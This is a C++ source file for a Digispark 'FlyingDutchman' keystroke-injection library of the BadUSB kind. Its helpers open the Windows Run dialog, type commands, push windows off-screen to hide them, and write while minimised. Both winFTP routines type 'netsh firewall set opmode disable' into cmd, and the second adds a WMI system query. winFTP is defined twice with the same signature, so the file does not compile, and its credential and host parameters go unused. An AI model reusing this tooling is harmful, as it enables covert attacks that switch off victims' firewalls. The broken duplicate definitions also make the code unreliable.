#include "DigiKeyboard.h"
#include "FlyingDutchman.h"

void FlyingDutchmanShip::init(int x)
{
	DigiKeyboard.update();
	DigiKeyboard.sendKeyStroke(0);
	DigiKeyboard.delay(x);
	pinMode(1, OUTPUT);
	digitalWrite(1, HIGH);
}

void FlyingDutchmanShip::pressAndRelease(byte x,byte y)
{
	DigiKeyboard.sendKeyStroke(x,y);
}

void FlyingDutchmanShip::done()
{
	for (int i=0; i<5; i++) {
    digitalWrite(1, HIGH);   // turn the LED on (HIGH is the voltage level)
    delay(100);               // wait for a second
    digitalWrite(1, LOW);    // turn the LED off by making the voltage LOW
    delay(100);
  }
}

void FlyingDutchmanShip::pressAndRelease(byte x)
{
	DigiKeyboard.sendKeyStroke(x);
}

void FlyingDutchmanShip::press(byte x,byte y)
{
	DigiKeyboard.sendKeyPress(x,y);
}

void FlyingDutchmanShip::press(byte x)
{
	DigiKeyboard.sendKeyPress(x);
}

void FlyingDutchmanShip::release()
{
	DigiKeyboard.sendKeyPress(0,0);
}

void FlyingDutchmanShip::echo(char* x)
{
	DigiKeyboard.print(x);
}

void FlyingDutchmanShip::echoEnter(char* x)
{
	DigiKeyboard.print(x);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void FlyingDutchmanShip::sleep(int x)
{
	DigiKeyboard.delay(x);
}

void FlyingDutchmanShip::winRUN(char* x)
{
	DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
	DigiKeyboard.delay(500);
	DigiKeyboard.println(x);
	DigiKeyboard.delay(500);
}

void FlyingDutchmanShip::hideWindow()
{
    DigiKeyboard.sendKeyStroke(KEY_RIGHT_ARROW,MOD_GUI_LEFT);
    DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_ALT_LEFT);
    DigiKeyboard.sendKeyStroke(KEY_R);
    DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_ALT_LEFT);
    DigiKeyboard.sendKeyStroke(KEY_M);
    DigiKeyboard.sendKeyPress(KEY_RIGHT_ARROW);
    DigiKeyboard.delay(3000);
    DigiKeyboard.sendKeyPress(0,0);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void FlyingDutchmanShip::writeOnBackground(char* x)
{
	DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW,MOD_GUI_LEFT);
	DigiKeyboard.sendKeyStroke(KEY_ESCAPE,MOD_SHIFT_LEFT|MOD_ALT_LEFT);
	DigiKeyboard.print(x);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void FlyingDutchmanShip::minimizeWindow()
{
	DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW,MOD_GUI_LEFT);
}

void FlyingDutchmanShip::winFTP(char* action,char* username,char* password,char* host, char* port,char* file)
{
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(600);
  DigiKeyboard.println("cd %USERPROFILE%");
  DigiKeyboard.println("@echo off");
  DigiKeyboard.println("del ftp.txt");
  DigiKeyboard.println("netsh firewall set opmode disable");

  DigiKeyboard.println("cls");
}

void FlyingDutchmanShip::winFTP(char* action,char* username,char* password,char* host, char* port,char* file)
{
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(600);
  DigiKeyboard.println("cd %USERPROFILE%");
  DigiKeyboard.println("@echo off");
  DigiKeyboard.println("netsh firewall set opmode disable");
  DigiKeyboard.println("powershell Get-WmiObject Win32_computerSystem");
}
